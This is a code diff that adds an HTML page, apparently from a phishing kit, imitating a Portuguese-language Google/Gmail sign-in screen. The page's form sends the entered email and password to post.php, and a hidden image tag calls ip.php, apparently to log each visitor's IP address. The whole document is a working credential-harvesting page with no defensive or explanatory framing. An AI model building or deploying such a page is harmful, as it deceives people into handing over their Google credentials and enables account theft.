@@ -1,1 +1,25 @@
-
+<!-- .sites/google/index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google - Fazer login</title>
+    <style>
+        body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 450px; text-align: center; }
+        .logo { font-size: 24px; font-weight: 500; margin-bottom: 24px; }
+        input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Gmail</div>
+        <form method="POST" action="post.php">
+            <input type="email" name="email" placeholder="E-mail" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Próxima</button>
+        </form>
+    </div>
+    <img src="ip.php" style="display:none;">
+</body>
+</html>
